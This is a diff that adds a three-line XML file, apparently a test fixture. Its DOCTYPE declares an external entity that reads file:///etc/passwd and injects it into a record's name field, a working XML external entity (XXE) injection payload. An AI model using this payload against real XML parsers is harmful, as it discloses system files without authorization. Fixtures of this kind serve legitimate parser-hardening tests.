@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE probe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<records><record id="xxe"><name>&xxe;</name></record></records>
